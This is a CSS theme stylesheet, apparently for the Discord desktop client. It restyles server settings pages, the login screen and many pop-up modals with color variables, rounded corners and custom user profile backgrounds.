/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Emoji  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Moderation  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.checkbox-1ix_J3 {
    -webkit-box-flex: 0;
    -ms-flex: 0 0 auto;
    flex: 0 0 auto;
    border-width: 1px;
    border-style: solid;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    border-radius: 90px;
}

.defaultMarginh3-2iptLs, .defaultMarginh5-2mL-bP {
    margin-bottom: 12px;
    margin-top: 12px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Audit Log  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.contentRegion-3nDuYy {
    background: var(--Color003);
}


/* Content */

.customScroller-26gWhv>div {
    background: var(--Color004);
    border-radius: 24px 24px 0 0;
    margin-top: 60px;
    margin-left: 60px;
    margin-right: 60px;
    margin-bottom: 0px;
    padding: 40px;
}


/* Card */

.theme-dark .auditLog-3jNbM6 {
	border: none;
}

.theme-dark .divider-1pnAR2 {
    display: none;
}

/* Card | Closed */

.theme-dark .headerClickable-2IVFo9, .theme-dark .headerDefault-1wrJcN {
    background: var(--Color005);
	border-radius: var(--Radius001);
}

/* Card | Open */

.theme-dark .headerExpanded-CUEwZ5 {
    background: var(--Color005);
	border-radius: var(--Radius001) var(--Radius001) 0 0;
}


.theme-dark .changeDetails-bk98pu {
    background: var(--Color003);
	border-radius: 0 0 var(--Radius001) var(--Radius001);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Integrations  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Widget  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Input */

.theme-dark .copyInputDefault-21sXtF {
    border: none;
}

.theme-dark .copyInput-2rOSt7 {
    background: var(--Color005);
    border-radius: var(--Radius001);
}



/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Server Template  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Community | Overview  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Welcome Screen  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.enableContainer-6E-puu {
    background: var(--Color003);
    filter: brightness(110%);
    border-radius: var(--Radius001) var(--Radius001) 0 0;
}

.previewContainer-1SS3uO {
    background: var(--Color003);
    padding: 16px;
    border-radius: 0 0 var(--Radius001) var(--Radius001);

}

/* Description */

.descriptionWrapper-1GiGtP {
    width: 100%;
    max-width: 900px;
    margin: 0 auto;
}

.input-cIJ7To::-webkit-scrollbar {
    display: none;
}

/* Text */

.descriptionInput-3b30C8[placeholder] {
    text-align: left;
    padding-right: 24px;
    padding-left: 24px;
}

/* Cards */

.welcomeChannel-1rFrIO {
    border-radius: var(--Radius002);
    background-color: var(--background-primary);
    margin-top: 8px;
    padding: 20px 20px;
}

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6 {
    color: var(--Color006);
    background: var(--Color001);
}

/* Button */

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6:hover {
    color: var(--Color006);
    background: var(--Color001);
    filter: brightness(120%);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Login |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark.authBox-hW6HRx {
    color: #72767d;
    background: var(--Color004);
}

.fallbackImage-31Sk4m {
    display: none;
}

.platform-win .splashBackground-1FRCko:before {
    display: none;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | User Popout ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Header */

.header-2BwW8b {
    background: var(--Color003);
    padding-bottom: 0px;
}

.reduce-motion .userPopout-3XzG_A {
    background: var(--Color003);
}

/* Background */

.theme-dark .headerNormal-T_seeN {
    background: var(--Color003)
}

.theme-dark .body-3iLsc4, .theme-dark .footer-1fjuF6 {
    background: var(--Color004);
    color: var(--Color006);
}

.userPopout-3XzG_A {
	box-shadow: var(--shadow001);
    width: 260px;
    border-radius: 24px;
    max-height: calc(90vh - 120px);
}

.bodyInnerWrapper-Z8WDxe {
    padding-right: 20px;
}

/* Activity */

.activity-11LB_k {
    background: var(--Color003);
    padding: 16px;
}

/* Status */

.customStatus-1bh2V9 {
    background: var(--Color004);
    padding: 16px 16px 16px 16px;
    text-align: left;
    line-height: 22px;
    margin-bottom: -20px;
}

/* Roles */

.role-2irmRk{

    position: relative;
    overflow: hidden;
    z-index: 1;
    border: none;
    padding: 5px;
}

.roleCircle-3xAZ1j::before{
    content: "";
    position: absolute;
    top:0;
    left:0;
    width:100%;
    height: 100%;
    background: inherit;
    opacity: .2;
    z-index: -1;
    pointer-events: none;
}

/* Note */

.textarea-2r0oV8::-webkit-scrollbar {
    width: 0px;
    height: 0px;
}


/* Footer */

.footer-1fjuF6 {
    padding: 0 16px 16px;
}

/* USRBG */

.reduce-motion .userPopout-3XzG_A {
	transform:translateZ(0);
}

.userPopout-3XzG_A .wrapper-3t9DeA::after {
    border-radius: var(--Radius001) var(--Radius001) 0 0;
	content: '';
	position: fixed;
	top: 0;
	left: 0;
    width: 260px;
    height: 174px;
	z-index: -1;
	pointer-events: none;
	opacity: 1;
	background-size: cover;
	background-repeat: no-repeat;
	background-position: var(--user-popout-position) center;
    background-image: var(--user-background);
    filter: brightness(50%) blur(0px);
}

.userPopout-3XzG_A  .header-2BwW8b,
.userPopout-3XzG_A  .scroller-2FKFPG,
.userPopout-3XzG_A  .footer-1fjuF6 {
	z-index: 1;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | User Profile |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Header */

.header-QKLPzZ {
    margin-bottom: 90px;
}

/* Activity */

.topSectionPlaying-1J5E4n {
    background: transparent;
}

.topSectionSpotify-1lI0-P {
    background: transparent;
}

.activity-1ythUs {
    background: var(--Color003);
}

/* Background */

.root-SR8cQa {
    border-radius: 24px;
	width: 900px;
    background-color: transparent;
}

.body-3ND3kc, .tabBarContainer-1s1u-z {
    background: var(--Color004);
}

.infoScroller-3EYYns {
    padding: 20px 12px 20px 12px;
}

/* Divider */

.userInfoSection-2acyCx+.userInfoSection-2acyCx {
    border: none;
}

/* Note */

.userInfoSectionHeader-CBvMDh {
    display: none;
    padding: 0px;
}

.note-QfFU8y {
    padding: 2px 12px 2px 12px;
    margin-right: 0px;
    margin-left: 0px;
    margin-bottom: -20px;
    margin-top: -20px;
}

.note-QfFU8y textarea {
    border-radius: 12px;
    font-size: 14px;
    line-height: 16px;
    padding: 4px;
}

/* Icon Tabs */

.connectedAccount-36nQx7 {
    z-index: 3;
    margin-top: 20px;
    margin-right: 12px;
    margin-left: 12px;
    padding: 8px 14px 8px 8px;
    width: 230px;
    background: var(--Color002);
	border-radius: 90px;
	border: none;
}

/* Spotify */

.assetsLargeImage-eYwpTX {
    border-radius: 90px;
    display: block;
    -o-object-fit: cover;
    object-fit: cover;
}

/* Buton */

.lookFilled-1Gx00P.colorGreen-29iAKY {
    background: var(--Color001);
    color: #fff;
}

.lookFilled-1Gx00P.colorGreen-29iAKY {

    background: var(--Color001);
    color: #fff;
}

/* USRBG */

.header-QKLPzZ .wrapper-3t9DeA::after {
    z-index: -1;
    content:'';
    position: absolute;
    top: -20px;
    left: -20px;
    width: 900px;
    height: 240px;
    opacity: 1;
    background: var(--user-background) center/cover no-repeat;
    background-color: var(--Color002);
    filter: brightness(60%) blur(0px);
  }




/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Verify Phone |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.phoneField-38N1bJ .countryButton-3xq3Ts {
    border-radius: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Pinbox |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.messagesPopoutWrap-1MQ1bW {
    border-radius: 24px;
    top: 10px;
    width: 900px;
}

.messageGroupWrapper-o-Zw7G {
    border-radius: 24px;
    margin: 12px;
}

.messagesPopout-24nkyi {
    padding: 0px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Inbox ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .header-2-Imhb .tabBar-1kuXvJ .tab-ck0077.active-1MbGPa {
    background-color: var(--Color001);
	border-radius: 90px;
}

.recentMentionsPopout-3rCiI6 {
    width: 35vw;
    max-width: 900px;
    min-width: 900px;
    max-height: 80vh;
}

.container-enaOkj {
    border-radius: 24px;
}

.container-3u944p {
	background: var(--Color004);
}

.icon-1Itzco {
    background-color: var(--Color003);
    border-radius: 80px;
    color: var(--text-muted);
    padding: 22px;
}

/* Unreads */

.icon-1Itzco {
    background-color: var(--Color003);
    border-radius: 80px;
    color: var(--text-muted);
    padding: 22px;
}

.stars-1YAEQv {
	display: none;
}

.size12-3cLvbJ {
    font-size: 13px;
    line-height: 16px;
}

/* Mention */

.guildIcon-3Co6k- {
    background-color: var(--Color002);
	border-radius: 90px;
}

.secondary-dIudih {
    background-color: var(--Color002);
    color: var(--Color008);
}

.container-3iAQ-0 {
    background-color: var(--Color005);
}


.channelHeader-3Gd2xq {
    background-color: var(--Color005);
}

.messageContainer-gbhlwo {
    background-color: var(--Color004);
    border-radius: 24px;
	padding: 0px;

}

.container-3iAQ-0 {
    margin-bottom: 0px;
    padding-left: 20px;
    padding-right: 20px;
}

.tertiary-aMXF0g {
    background-color: var(--Color002);
    color: var(--Color008);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Status Selection |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.menu-3sdvDG {
    border-radius: 20px;
}

.item-1tOPte {
    border-radius: 24px;
}

.description-2L932D {
    margin-bottom: 0px;
    font-size: 0px;
    line-height: 0px;

}

.scroller-3BxosC {
    padding: 8px 8px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Contex Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.wrapper-2aW0bm {
    background-color: var(--Color002);
    border-radius: 24px;
	box-shadow: var(--shadow001)
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Share Media ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */


.attachPopout-36hjtN {
    border-radius: 24px;
    background-color: var(--Color005);
    box-shadow: none;
}

.attachPopoutRow-3iqqu1 {
    border-radius: 90px;
    color: var(--Color008);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Search History |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.searchResultsWrap-3-pOjs {
    background-color: var(--Color003);
    width: 800px;
}

.searchResult-9tQ1uo:before {
    z-index: 1;
    top: 0;
    background-image: linear-gradient(0deg,#0000,var(--Color003));
}

.searchResult-9tQ1uo:after {
    bottom: 0;
    background-image: linear-gradient(180deg,#0000,var(--Color003));
}

.channelName-1JRO3C {
    background: var(--Color003);
}

.searchResultMessage-1fxgXh.hit-1fVM9e {
    background: var(--Color004);
    position: relative;
    z-index: 1;
    max-height: none;
	box-shadow: var(--shadow001);
    border: none;
    border-radius: 24px;
	padding-bottom: 20px;
	padding-top: 20px;
}

.searchResult-9tQ1uo.expanded-w_LCGl {
    background: var(--Color005);
    border-radius: 24px;
	border: none;
	padding-bottom: 20px;
	padding-top: 20px;
}

.expanded-w_LCGl .searchResultMessage-1fxgXh.hit-1fVM9e {
    background: var(--Color004);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Color Picker |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .colorPickerCustom-2CWBn2 {
    background: var(--Color004);
	border: none;
	box-shadow: var(--shadow001);
    border-radius: var(--Radius001);
}

.backdrop-1wrmKB {
	opacity: 0.1;
    background: #fff;
    transform: translateZ(0px);
}

.saturation-1FDvtn>div, .saturation-1FDvtn>div>div {
    border-radius: var(--Radius001);
}

.saturation-black {
    border-radius: 20px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Emoji Picker |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.inspector-S2gM3e {
    background-color: var(--Color005);
}

.contentWrapper-SvZHNd {
    background: var(--Color005);
    border-radius: 24px;
	padding-bottom: 40px;
    height: 111%;
	box-shadow: none;
}

.positionContainer-DEuh7X {
    height: 444px;
    z-index: 2;
}

.theme-dark .wrapper-1-Fsb8 {
    background: var(--Color005);
	border-radius: 24px;
}

/* Search */

.container-2XeR5Z {
    background-color: var(--Color004);
	border-radius: 90px;
}

.input-3Xdcic {
    background-color: var(--Color004);
	border-radius: 90px;
}

/* Header */

.inspector-sdLnLS {
    background: var(--Color003);
	border-radius: 24px;
}

/* Button */

.navButtonActive-1MkytQ {
    background-color: var(--Color001);
    color: #fff;
}

/* Icon */

.categoryItemDefaultCategorySelected-_HCKoz, .categoryItemDefaultCategorySelected-_HCKoz:hover {
    background-color: var(--Color003);
	border-radius: 90px;

}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Autocomplete |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.theme-dark .autocomplete-1vrmpx {
    background: var(--Color005);
    bottom: calc(100% - 8px);
    border-radius: 24px;
    box-shadow: none;
	padding-bottom: 48px;
	margin-bottom: -42px;
	z-index: 1;
}

/* Header */

:root .contentTitle-2tG_sM {
    color: var(--Color006);
}

/* Selector */

.theme-dark .selected-1Tbx07 {
    background: var(--Color003);
	border-radius: 90px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Create Channel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .modal-yWgWj- {
    background-color: var(--Color003);
    box-shadow: none;
	border-radius: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Reaction Emoji Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.emojiPicker-3PwZFl {
    background-color: var(--Color005);
    border-radius: 24px;
    box-shadow: none;
	border: none;
}

/* Inspector */

.inspector-sdLnLS {
    background: var(--Color005);
    border-radius: 24px;
}

/* Emoji */

.unicodeShortcut-15J8Ck {
    color: var(--Color008);
    height: 56px;

}

.emojiItem-14v6tW.emojiItemSelected-1aLkfV {
    background: var(--Color002);
    border-radius: 90px;
}

.guildIcon-3h-1IH {
    background: var(--Color002);
	border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Upload  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .uploadModal-2ifh8j {
    background: var(--Color003);
    border-radius: 24px;
    box-shadow: none;
}

.theme-dark .footer-3mqk7D {
    background: var(--Color005);
    border-radius: 0 0 24px 24px;
    box-shadow: none;
}


.uploadModal-2ifh8j .inner-3nWsbo .file-34mY5K .icon-kyxXVr.image-2yrs5j {
    margin-top: -33px;
    margin-left: 16px;
    margin-right: 16px;
    width: 104px;
    height: 104px;
    background-color: #fff;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    border-radius: 90px;
    background-size: contain;
    -webkit-box-shadow: 0 2px 8px rgba(0,0,0,.4);
    box-shadow: 0 2px 8px rgba(0,0,0,.4);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Delete Message ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .message-2qRu38 {
    background-color: var(--Color004);
    border: none;
    box-shadow: none;
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Create a Server  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-light .root-1gCeng {
    background: var(--Color003);
    box-shadow: none;
}

.theme-light .footer-2gL1pp {
    background: var(--Color005);
    box-shadow: none;
}

.lookFilled-1Gx00P.colorGrey-2DXtkV {
    color: var(--Color006);
    background: var(--Color001);
}

/* Button */

.lookFilled-1Gx00P.colorGrey-2DXtkV:hover {
    color: var(--Color006);
    background: var(--Color001);
    filter: brightness(120%);
}

/* Template */

.itemContainer-1LSFks {
    border-radius: 24px;
    border: none;
    background: var(--Color004);
    margin-bottom: 12px;
}

.templatesList-2E6rTe {
    margin-top: 24px;
    padding: 0px 12px 12px 12px;
    height: 330px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Set a custom status  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Select Server Region  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-dark .regionSelectModal-12e-57 {
    background: var(--Color004) !important;
}

/* Header Text */

.regionSelectModal-12e-57 .regionSelectModalHeader-21khC1 {
    color: var(--Color007);
    margin-bottom: 20px;
}

/* Buttons */

.theme-dark .regionSelectModalOption-2DSIZ3 {
    background: var(--Color003);
    border: none;
    border-radius: 90px;
}

.theme-dark .regionSelectModalOption-2DSIZ3:hover {
    background: var(--Color002);
    border: none;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
